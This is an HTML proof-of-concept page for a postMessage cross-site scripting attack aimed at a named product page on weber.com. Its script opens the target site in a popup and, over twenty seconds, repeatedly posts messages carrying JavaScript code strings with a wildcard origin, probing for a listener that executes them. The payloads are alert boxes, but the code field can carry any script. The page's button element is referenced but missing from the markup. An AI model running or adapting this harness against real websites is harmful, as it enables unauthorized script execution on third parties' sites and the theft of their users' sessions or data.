<!DOCTYPE html>
<meta charset="utf-8" />
<title>postMessage XSS PoC — weber.com</title>
<body>

  postMessage XSS PoC — weber.com

<script>
const TARGET = "https://www.weber.com/US/en/smoquepelletgrill.html"; // change if needed
const RUNTIME_MS = 20000;   // total send time
const INTERVAL_MS = 350;    // send cadence

// Add/modify fields if the listener expects e.g. {type:"exec"} or similar
const payloads = [
  { isTrusted: true, code: "alert('pwned: '+document.domain)" },
  JSON.stringify({ isTrusted: true, code: "alert('pwned JSON: '+document.domain)" })
];

function sendTo(win){
  for (const p of payloads) { try { win.postMessage(p, "*"); } catch(_){} }
}

document.getElementById('go').onclick = () => {
  // user gesture -> opener is set, avoids popup blocker
  const w = window.open(TARGET, "weber_poc", "noopener=false"); // keep opener
  if (!w) { alert("Popup blocked – allow popups for this page and click again."); return; }

  // retry for late-loaded code / SPA transitions
  const t0 = Date.now();
  const timer = setInterval(() => {
    if (Date.now() - t0 > RUNTIME_MS) { clearInterval(timer); return; }
    sendTo(w);
    // also try posting back to ourselves (some handlers echo to opener)
    try { w.postMessage({ isTrusted:true, code:"window.opener && window.opener.postMessage('OPENER_OK','*')" }, "*"); } catch(_){}
  }, INTERVAL_MS);
};
</script>
</body>
